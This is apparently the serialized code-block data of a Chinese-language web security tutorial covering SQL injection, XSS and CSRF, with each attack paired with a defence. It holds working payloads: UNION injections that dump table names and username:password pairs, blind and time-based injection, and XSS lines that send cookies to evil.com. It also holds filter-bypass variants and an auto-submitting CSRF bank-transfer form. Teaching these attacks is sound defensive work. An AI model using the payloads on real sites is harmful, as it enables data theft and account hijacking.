39:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"-- 判断字段数量\n' ORDER BY 1 --\n' ORDER BY 2 --\n' ORDER BY 3 --     -- 直到报错，确定字段数\n\n-- 联合查询获取数据库信息\n' UNION SELECT 1,version(),database() --\n\n-- 获取所有表名\n' UNION SELECT 1,group_concat(table_name),3 \n  FROM information_schema.tables \n  WHERE table_schema=database() --\n\n-- 获取指定表的列名\n' UNION SELECT 1,group_concat(column_name),3 \n  FROM information_schema.columns \n  WHERE table_name='users' --\n\n-- 提取用户数据\n' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users --\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-sql","children":"-- 判断字段数量\n' ORDER BY 1 --\n' ORDER BY 2 --\n' ORDER BY 3 --     -- 直到报错，确定字段数\n\n-- 联合查询获取数据库信息\n' UNION SELECT 1,version(),database() --\n\n-- 获取所有表名\n' UNION SELECT 1,group_concat(table_name),3 \n  FROM information_schema.tables \n  WHERE table_schema=database() --\n\n-- 获取指定表的列名\n' UNION SELECT 1,group_concat(column_name),3 \n  FROM information_schema.columns \n  WHERE table_name='users' --\n\n-- 提取用户数据\n' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users --\n"}]}]]}]
3c:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"-- 判断数据库名的第一个字符\n' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 100 --\n' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 110 --\n' AND (SELECT ASCII(SUBSTRING(database(),1,1))) = 115 --   -- 's'\n\n-- 判断数据库版本\n' AND (SELECT LENGTH(version())) = 6 --\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-sql","children":"-- 判断数据库名的第一个字符\n' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 100 --\n' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 110 --\n' AND (SELECT ASCII(SUBSTRING(database(),1,1))) = 115 --   -- 's'\n\n-- 判断数据库版本\n' AND (SELECT LENGTH(version())) = 6 --\n"}]}]]}]
3f:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"-- 如果数据库名第一个字符 ASCII 码大于 100，则延迟 5 秒\n' AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(5), 0) --\n\n-- MySQL 时间盲注\n' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 's%') --\n\n-- PostgreSQL 时间盲注\n'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-sql","children":"-- 如果数据库名第一个字符 ASCII 码大于 100，则延迟 5 秒\n' AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(5), 0) --\n\n-- MySQL 时间盲注\n' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 's%') --\n\n-- PostgreSQL 时间盲注\n'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --\n"}]}]]}]
41:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"# 正确做法：使用参数化查询（Parameterized Query）\nimport mysql.connector\n\nconn = mysql.connector.connect(host='localhost', database='myapp')\ncursor = conn.cursor(prepared=True)\n\n# 参数化查询 — 数据库驱动自动处理转义\nquery = \"SELECT * FROM users WHERE username = %s AND password = %s\"\ncursor.execute(query, (username, password))\n\n# ORM 框架（如 SQLAlchemy）也能有效防止 SQL 注入\nfrom sqlalchemy import select\nstmt = select(User).where(User.username == username)\nresult = session.execute(stmt)\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-python","children":"# 正确做法：使用参数化查询（Parameterized Query）\nimport mysql.connector\n\nconn = mysql.connector.connect(host='localhost', database='myapp')\ncursor = conn.cursor(prepared=True)\n\n# 参数化查询 — 数据库驱动自动处理转义\nquery = \"SELECT * FROM users WHERE username = %s AND password = %s\"\ncursor.execute(query, (username, password))\n\n# ORM 框架（如 SQLAlchemy）也能有效防止 SQL 注入\nfrom sqlalchemy import select\nstmt = select(User).where(User.username == username)\nresult = session.execute(stmt)\n"}]}]]}]
47:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"# 攻击 URL 示例\nhttps://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>\n"}],["$","div",null,{"className":"[&>pre]:!m-0","dangerouslySetInnerHTML":{"__html":"<pre class=\"shiki shiki-themes min-light night-owl\" style=\"--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627\" tabindex=\"0\"><code><span class=\"line\"><span># 攻击 URL 示例</span></span>\n<span class=\"line\"><span>https://example.com/search?q=&#x3C;script>document.location='https://evil.com/steal?cookie='+document.cookie&#x3C;/script></span></span>\n<span class=\"line\"><span></span></span></code></pre>"}}]]}]
4a:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"<!-- 攻击者在评论区提交的恶意内容 -->\n<img src=x onerror=\"fetch('https://evil.com/log?c='+document.cookie)\">\n\n<!-- 利用事件处理器的 XSS Payload -->\n<svg onload=\"alert('XSS')\">\n\n<!-- 绕过简单过滤的变形 Payload -->\n<img src=x onerror=alert(String.fromCharCode(88,83,83))>\n<iframe src=\"javascript:alert('XSS')\">\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-html","children":"<!-- 攻击者在评论区提交的恶意内容 -->\n<img src=x onerror=\"fetch('https://evil.com/log?c='+document.cookie)\">\n\n<!-- 利用事件处理器的 XSS Payload -->\n<svg onload=\"alert('XSS')\">\n\n<!-- 绕过简单过滤的变形 Payload -->\n<img src=x onerror=alert(String.fromCharCode(88,83,83))>\n<iframe src=\"javascript:alert('XSS')\">\n"}]}]]}]
4d:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"// 存在 DOM XSS 漏洞的代码示例\n// URL: https://example.com/page#<img src=x onerror=alert(1)>\nvar hash = location.hash.substring(1);\ndocument.getElementById('output').innerHTML = hash;  // 危险！直接插入 HTML\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-javascript","children":"// 存在 DOM XSS 漏洞的代码示例\n// URL: https://example.com/page#<img src=x onerror=alert(1)>\nvar hash = location.hash.substring(1);\ndocument.getElementById('output').innerHTML = hash;  // 危险！直接插入 HTML\n"}]}]]}]
4f:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"# Python Flask 中的 XSS 防御\n\n# 1. 输出编码 — 对所有用户输入进行 HTML 实体编码\nfrom markupsafe import escape\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    safe_query = escape(query)  # 将 < > \" ' & 转为 HTML 实体\n    return render_template('search.html', query=safe_query)\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-python","children":"# Python Flask 中的 XSS 防御\n\n# 1. 输出编码 — 对所有用户输入进行 HTML 实体编码\nfrom markupsafe import escape\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    safe_query = escape(query)  # 将 < > \" ' & 转为 HTML 实体\n    return render_template('search.html', query=safe_query)\n"}]}]]}]
50:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"// 前端 JavaScript XSS 防御\n\n// 使用 textContent 而非 innerHTML\ndocument.getElementById('output').textContent = userInput;\n\n// 如果必须插入 HTML，使用 DOMPurify 进行净化\nconst clean = DOMPurify.sanitize(userInput);\ndocument.getElementById('output').innerHTML = clean;\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-javascript","children":"// 前端 JavaScript XSS 防御\n\n// 使用 textContent 而非 innerHTML\ndocument.getElementById('output').textContent = userInput;\n\n// 如果必须插入 HTML，使用 DOMPurify 进行净化\nconst clean = DOMPurify.sanitize(userInput);\ndocument.getElementById('output').innerHTML = clean;\n"}]}]]}]
57:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"<!-- CSRF 攻击示例 — 恶意页面中隐藏的表单 -->\n<form action=\"https://bank.example.com/transfer\" method=\"POST\" id=\"csrfForm\">\n  <input type=\"hidden\" name=\"to_account\" value=\"attacker_account\">\n  <input type=\"hidden\" name=\"amount\" value=\"10000\">\n</form>\n<script>document.getElementById('csrfForm').submit();</script>\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-html","children":"<!-- CSRF 攻击示例 — 恶意页面中隐藏的表单 -->\n<form action=\"https://bank.example.com/transfer\" method=\"POST\" id=\"csrfForm\">\n  <input type=\"hidden\" name=\"to_account\" value=\"attacker_account\">\n  <input type=\"hidden\" name=\"amount\" value=\"10000\">\n</form>\n<script>document.getElementById('csrfForm').submit();</script>\n"}]}]]}]
5a:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L5e",null,{"text":"# Flask 中使用 CSRF Token 防护\nfrom flask_wtf.csrf import CSRFProtect\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'your-secret-key'\ncsrf = CSRFProtect(app)\n\n# 模板中自动插入 CSRF Token\n# <form method=\"post\">\n#     <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token() }}\">\n#     ...\n# </form>\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-python","children":"# Flask 中使用 CSRF Token 防护\nfrom flask_wtf.csrf import CSRFProtect\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'your-secret-key'\ncsrf = CSRFProtect(app)\n\n# 模板中自动插入 CSRF Token\n# <form method=\"post\">\n#     <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token() }}\">\n#     ...\n# </form>\n"}]}]]}]
